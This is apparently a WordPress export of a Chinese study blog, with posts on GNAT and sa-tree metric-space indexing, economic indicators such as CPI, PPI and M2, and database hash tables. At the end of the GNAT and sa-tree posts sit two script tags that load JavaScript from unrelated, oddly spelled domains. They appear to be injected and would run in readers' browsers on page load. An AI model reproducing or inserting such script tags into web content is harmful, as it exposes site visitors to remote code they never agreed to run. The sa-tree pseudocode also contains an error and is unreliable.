<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>通过赋予数据点较多的子树更多的度，来平衡子树。赋给根节点一个度k，它的每个孩子结点根据包含的数据点，成比例地被分配一个度，使得孩子的平均度等于全局度k. 递归地进行这个过程，使每个孩子的平均度都为k（忽略最高度和最低度）。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>参考资料</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[1] Near Neighbor Search in Large Metric Spaces</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[基因序列比对、声音识别、图片识别等数据都在分布上存在一定关联性，利用这些关联性可以提升近邻搜索的性能。为了达到这个目的，要求数据结构能够反映数据的内在几何特征。GNAT通过在多个层次上将数据分割为多个区域来保留基本几何结构。]]></excerpt:encoded>
		<wp:post_id>240</wp:post_id>
		<wp:post_date><![CDATA[2021-12-11 14:17:24]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-12-11 06:17:24]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-12-11 14:28:18]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-12-11 06:28:18]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[near-neighbor-search-in-large-metric-spaces]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="gnat"><![CDATA[GNAT]]></category>
		<category domain="category" nicename="metric-space-indexing"><![CDATA[度量空间索引]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[242]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[sa-tree: 通过空间接近在度量空间中进行搜索]]></title>
		<link>http://www.ironmanzzm.top/?p=246</link>
		<pubDate>Sat, 11 Dec 2021 06:27:28 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/?p=246</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>Navarro</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>背景</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>近似查询</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>与精确查找相对，查找相似的对象。进行文本查询时，数据库中的文本可能存在印刷或拼写错误，我们仍然想要得到这些结果；或者给出一段文本，我们想得到近似的文本。在机器学习和分类中，一个元素根据一个跟它距离比较近的元素对它进行分类。计算生物中，我们需要在数据库中查找DNA和蛋白质序列，但可能因为变异产生一些差异。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>高位数据存取问题</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>高维数据距离计算带来的开销成为制约数据库查询性能的一大原因，已有的多维空间索引如kd-tree和R-tree在维度超过20维以后性能就会下降。维度更高的数据之间的概率分布会更加集中，平均值也更大。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="http://img.ironmanzzm.top/blog-img/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211130093255.png" alt="image"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>图中可以看到维度更高的时候，白色区域面积更小，使用三角不等式可以排除的元素也就更小。另一方面，由于数据分布集中，两个随机距离之差会更接近零，难以使用三角不等式<code>|d(q, p) - d(p, x)| &gt; r</code>判断数据点x是否在查询范围以外。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>sa-tree</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>采用从空间上逐渐接近查询结果的策略，不同于通常的对候选点进行划分的做法。Navarro提出的sa-tree专门用于空间搜索(spatial searching)，不同于对数据点集进行分割的分治策略，sa-tree从某个随机点开始，逐渐接近查询对象q.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>sa-tree为了进行空间近似查询，必须满足以下性质：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>性质一:</strong> 对于数据点集中的任意一点a，给定查询点q，b是N(a)中的任意一点，如果满足d(q, a) &lt;= d(q, b)，那么数据点集中除a外的任意一点离q都不可能比a更近。<br>也就是说，对于任一点a都拥有一个可能是解的点集，点集中的点到a比到数据集中其他的点更近。在计算几何中类似与欧式空间中的“维诺区域”（通用度量空间中称为“狄利克雷区域”）。<br><strong>如果点a不是所需要的答案，我们需要能够从a区域移动到另一个离q比较近的元素，所以只要连接每个点的维诺邻居中心即可。所谓维诺邻居就是指在维诺图中共享一条边界的两个区域。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>维诺邻居中心点相互连接后就构成了Delaunay图，这是最理想的结构。<strong>但是在一般度量空间中只给出点与点之间的距离，没有办法计算出Delaunay图，因为给定点之间的距离，在不同的空间中会有不同的图。而且只通过距离没有办法判断一条边是否处于Delaunay图中。</strong>（why?）我们可以通过以下定理将这一点形式化：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>定理一:</strong> 给定某未知度量空间U中的有限子集S中每个点对的距离。S中的点对a和b，对于U都存在一种选择，使得a和b在关于S的Delaunay图中互相连接。<br>证明见论文，没太看懂。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>构建过程</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>先随机选择一个点a作为SAT的根节点，然后选择一个合适的邻居集合N(a)，集合中的元素满足</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>性质二：</strong> N(a)中的任意两个点的距离大于这两个点到a的距离。</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>BuildTree(结点 a, 点集 S)
    N(a) = NULL /*a的邻居集合*/
    R(a) = 0    /*a的覆盖半径*/
    根据到a的距离由近到远对S中的点进行排序
    for each v in S:
        R(a) = max(R(a), d(v, a))
        if v到N(a)中任意已有点b的距离大于到a的距离:
            N(a) = N(a) + {v}
    for each b in N(a):
        S(b) = NULL     /*以邻居为根的子树初始化为空*/
    for each v in S-N(a):
        找到N(a)中离v最近的点c
        S(c) += {c}
    for each b in N(a):
        BuildTree(b, S(b))</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>论文[57]给出的构建算法并没有递归出口，构建完成的条件是什么呢？</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>SAT结点中保存</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>参考资料</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[57]Navarro. Searching in metric spaces by spatial approximation.</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[采用从空间上逐渐接近查询结果的策略，不同于通常的对候选点进行划分的做法。Navarro提出的sa-tree专门用于空间搜索(spatial searching)，不同于对数据点集进行分割的分治策略，sa-tree从某个随机点开始，逐渐接近查询对象。]]></excerpt:encoded>
		<wp:post_id>246</wp:post_id>
		<wp:post_date><![CDATA[2021-12-11 14:27:28]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-12-11 06:27:28]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-12-11 14:27:29]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-12-11 06:27:29]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[sa-tree-%e9%80%9a%e8%bf%87%e7%a9%ba%e9%97%b4%e6%8e%a5%e8%bf%91%e5%9c%a8%e5%ba%a6%e9%87%8f%e7%a9%ba%e9%97%b4%e4%b8%ad%e8%bf%9b%e8%a1%8c%e6%90%9c%e7%b4%a2]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="sa-tree"><![CDATA[sa-tree]]></category>
		<category domain="category" nicename="metric-space-indexing"><![CDATA[度量空间索引]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[247]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[常见经济指标汇总]]></title>
		<link>http://www.ironmanzzm.top/?p=258</link>
		<pubDate>Sat, 19 Feb 2022 15:41:05 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=258</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading -->
<h2 id="gdp">GDP</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>国内生产总值（Gross Domestici Product）</strong> 是一个国家（或地区）所有常住单位在一定时期内生产活动的最终成果。GDP是国民经济核算的核心指标，也是衡量一个国家或地区经济状况和发展水平的重要指标。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="cpi">CPI</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>消费者物价指数（Consumer Price Index）</strong>，又名居民消费价格指数，是反映一定时期内城乡居民所购买的生活消费品和服务项目价格变动趋势和程度的相对数。它是进行经济分析和决策、价格总水平监测和调控及国民经济核算的重要指标。其变动率在一定程度上反映了通货膨胀或紧缩的程度。一般来讲，物价全面地、变化对比、持续地上涨就被认为发生了通货膨胀。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>CPI低于0意味着发生了通缩。商品降价导致企业利润下降，引起裁员失业。因此保持1%~2%的温和通畅率是最好的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="ppi">PPI</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>生产价格指数（Producer Price Index，PPI）</strong> 是衡量工业企业产品出厂价格变动趋势和变动程度的指数，是反映某一时期生产领域价格变动情况的重要经济指标，也是制定有关经济政策和国民经济核算的重要依据。生产者物价指数与CPI不同，主要的目的是衡量企业购买的一篮子物品（原材料、能源等）和劳务的总费用。由于企业最终要把它们的费用以更高的消费价格的形式转移给消费者，所以，通常认为生产物价指数的变动对预测消费物价指数的变动是有用的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>PPI向上，说明需求旺盛，经济周期向上；PPI向下，则代表经济周期向下。<strong>因此PPI是周期类投资必看指标，PPI不涨，就不要大举投资钢铁、有色、煤炭和石油等周期性行业</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="m0-m1-m2">M0、M1、M2</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>M0 = 流通中的现金

M1 = M0 + 活期存款

M2 = M1 + 定期存款</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>以上三者按照流动性排倒序，M1比M2更活跃。当货币供应量上升时，如果M1比M2增长更快，说明大家把钱从定期存款取出，市场上资金活跃，通常会发生牛市。M1下穿M2，意味着市场货币收缩，大家不看好投资。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>这个指标跟房价也有关系。货币宽松，房价才能上涨；货币收缩，M1下降房价就会回落。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="国债十年收益率">国债十年收益率</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>一般用国债十年收益率来表示市场的无风险收益率。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>当市场缺钱，国债收益率就会上升，因为缺钱国家就需要给出更高的利息吸引投资者购买国债，<strong>所以国债收益率上升时股市往往表现不好</strong>。国债收益上升过急，就很有可能形成股债双杀。比如2016年底，债卷市场表现就不是很好。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>国债收益率下行，意味着市场上的钱越来越多，市场基金很充裕，是投资债券的好时机。</strong> 国债收益率下降得越快，债券价格就会涨得越多。这是因为国债收益率下降时经济处于降息周期，新发债券给出的收益较低，投资者倾向于购买老债券，因此证券价格上涨。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="社会融资总额">社会融资总额</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>主要包括银行贷款、股票融资、发债融资、非标融资和专项债这几项的总额。该指标反映资金需求程度，通常跟M2走势差距不大。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>社会融资总额下降说明经济需求比不足，大家对未来不看好。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="社会消费品零售总额">社会消费品零售总额</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>经济发展三驾马车包括投资、出口和消费。社会消费品零售总额反应消费者的消费能力和意愿，是表现国内消费需求最直接的数据。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="pmi">PMI</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>采购经理指数（Purchasing Managers' Index）</strong>，是通过对采购经理的月度调查汇总出来的指数，能够反映经济的变化趋势。如果采购经理看好经济，就会加大采购量，态度积极乐观；反之则会减少采购。因此PMI通常是经济的先行指标。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>PMI的枯荣线为50，50以上代表经济扩张，50以下代表经济收缩。PMI每个月会有统计局数据和财新PMI公布，统计局PMI主要统计国企数据，财新PMI代表中小企业。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="crb">CRB</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>路透社公布的追踪大宗商品走势的指数，通常反映了大宗商品的周期性波动。大宗商品的周期反应经济周期。大宗商品包括工业金属、贵金属、农产品和能源品。CRB不呈现上涨趋势，尽量不要投入到周期性行业。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>库存分为：主动去库存（经济不景气）、涨价去库存（经济复苏）、主动补库存（经济繁荣）、被动补库存（开始衰退）四个周期。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="信用利差">信用利差</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>李嘉诚和张三同期向银行借贷，由于李嘉诚违约概率更低，因此银行给李嘉诚5%的利率，给我10%的利率，由此产生5%的信用利差。但是当经济发展好，银行资金充裕，信心更强，给李嘉诚4%的利率，给我7%的利率。此时信用利差就由5%下降到3%.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>因此，信用利差上涨，说明经济遇冷，中小企业融资成本上升；信用利差下降，说明经济向好，中小企业贷款成本下降。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="mlf">MLF</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>中期借款便利（Medium-term Lending Facility）</strong> 发挥中期政策利率的作用，通过调节向金融机构中期融资的成本来对金融机构的资产负债表和市场预期产生影响，引导其向符合国家政策导向的实体经济部门提供低成本资金，促进降低社会融资成本。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>MLF的变动代替基准贷款利率，MLF持续走低，贷款利率也会下降，相当于变相降息。反之则有加息的效果。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="dr007">DR007</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>银行间市场7天质押回购利率</strong>是存款类机构间(交易者主要指银行机构)利率债质押(质押品仅限于国债、央行票据、政策性金融债)的七天回购利率。该指标能更好地反映银行体系流动性松紧状况。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1 id="参考资料">参考资料</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[1] <a href="https://www.bilibili.com/video/BV1eK4y1P7TF?p=1">【干货】11分半钟看懂各种经济指标 GDP CPI PPI M2 利率 PMI CRB</a></p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[对几种常用的经济指标进行总结，如: GDP, CPI, PPI, PMI等。搞清楚这些指标的含义和用法，更好地指导我们的搞钱大业。]]></excerpt:encoded>
		<wp:post_id>258</wp:post_id>
		<wp:post_date><![CDATA[2022-02-19 23:41:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-19 15:41:05]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-23 10:16:55]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-23 02:16:55]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%b8%b8%e8%a7%81%e7%bb%8f%e6%b5%8e%e6%8c%87%e6%a0%87%e6%b1%87%e6%80%bb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e7%bb%8f%e6%b5%8e%e5%ad%a6"><![CDATA[经济学]]></category>
		<category domain="category" nicename="%e7%bb%8f%e6%b5%8e%e9%87%91%e8%9e%8d"><![CDATA[经济金融]]></category>
		<category domain="post_tag" nicename="%e9%87%91%e8%9e%8d"><![CDATA[金融]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[260]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[06 Hash Table]]></title>
		<link>http://www.ironmanzzm.top/?p=262</link>
		<pubDate>Tue, 22 Feb 2022 05:45:48 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=262</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>数据库系统中记录被保存在页中，为了能找到某条记录保存在那一页，需要一些数据结构保存两者之间的映射关系。常用的数据结构有<strong>哈希表</strong>和<strong>树</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>哈希表由<strong>哈希函数</strong>以及<strong>哈希布局</strong>两方面组成，哈希函数负责计算哈希值，哈希布局规定数据在表中如何被存取。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="hash-function">Hash Function</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>哈希表是一种key到value的无序映射。以key为参数，通过哈希函数计算出的哈希值作为存储位置，在对应的位置对value进行存取。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>空间复杂度: <code>O(n)</code><br>时间复杂度:<br>→ 平均: <code>O(1)</code><br>→ 最坏: <code>O(n)</code></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="常用哈希函数">常用哈希函数</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4 id="crc32-1975">CRC32（1975）</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>常用于差错检测。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 id="murmur-hash-2008">Murmur Hash（2008）</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>一个快速通用的哈希函数，是目前最常用的哈希函数之一。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 id="google-cityhash-2011">Google CityHash（2011）</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>对于短key(&lt; 64bytes)速度更快。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 id="facebook-xxhash-2012">Facebook XXHash（2012）</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>是四种哈希函数中最高效的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 id="google-farmhash-2014">Google FarmHash（2014）</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>CityHash的改进版，碰撞率更低。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><br><img src="http://img.ironmanzzm.top/blog-img/20220221102732.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="hash-scheme">Hash Scheme</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>哈希布局分为静态哈希和动态哈希。静态哈希在进行扩容或缩容时，需要对整个哈希表重新进行映射；动态哈希可以动态扩充哈希表的容量，而不用重新映射。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="静态哈希">静态哈希</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4 id="linear-probe-hashing">Linear Probe Hashing</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>即开放定址法。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 id="robin-hood-hashing">Robin Hood Hashing</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Robin Hood Hashing</strong>借鉴了罗宾汉劫富济贫的思想。每个条目保存当前保存位置到最初哈希位置的距离，一个元素距离初始哈希位置越近就越“富”，越远则越“穷”，穷人遇到富人可以抢占他住的地方，使所有位置产生冲突的次数基本均衡。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>假设现在需要插入一个<code>key</code>，计算出它的哈希值，将插入元素到初始位置的距离<code>d1</code>记为<code>0</code>，发生冲突时向后进行线性查找。如果当前查找位置仍然存在冲突，比较该位置上保存的距离<code>d2</code>。若<code>d1</code>&lt;=<code>d2</code>，继续向后查找；若<code>d1</code>&gt;<code>d2</code>，则新元素被插入到该位置，之后的所有元素被向后移动一个单位。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>这种方法使所有<code>key</code>发生冲突后向后查找步数基本平均，但带来了更多读写操作，频繁的后移会使Cache命中率下降（因为内存地址改变了），可能带来整体效率的下降。因此实际应用不如开放定址法广泛。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 id="cuckoo-hashing">Cuckoo Hashing</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Cuckoo Hashing</strong>很像布谷鸟在别人的巢穴下蛋的行为。这种方法建立两张哈希表，分别记为<code>TableA</code>和<code>TableB</code>。对给定的哈希函数分别传入不同的<code>seed</code>，使其能为同一个<code>key</code>产生不同的哈希值，将产生的两个哈希函数分别记为<code>HashA</code>和<code>HashB</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li><code>HashA</code>和<code>HashB</code>计算出的哈希值都不存在冲突，则随机选择<code>TableA</code>或<code>TableB</code>进行插入；</li><li>其中一个哈希值存在冲突，另一个没有冲突，则插入到没有冲突的表；</li><li>两个哈希值都冲突，则随机选择一个表，将表中冲突的元素挤出，被挤出的元素重新计算哈希值，按照同样的规则被插入到一个新位置。</li></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>注意按照上面冲突处理方式，是有可能产生无限循环的。因为有可能在步骤三轮了一圈下来，最开始挤走别人的那个元素又被挤下来了，这样就进入了循环。因此需要记录最开始的那个元素，如果它再次被挤，说明需要对哈希表进行扩容了。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="动态哈希">动态哈希</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4 id="chained-hashing">Chained Hashing</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>即链表法。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 id="可扩展哈希extendible-hashing">可扩展哈希Extendible Hashing</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果不对链表法中的链表长度加以限制，某条链表就有可能无限增长下去，这将造成极大的查询开销。为了解决链表无限增长的问题，引入可扩展哈希。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>可扩展哈希和链表法哈希一样，由保存链表指针的Slot数组以及多个链表组成。slot数组拥有一个global计数位，每个链表拥有一个local计数位，计数位为n则表示进行哈希时取key的二进制码的前n位作为哈希值。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 id="查找">查找</h5>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="http://img.ironmanzzm.top/blog-img/20220221234249.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
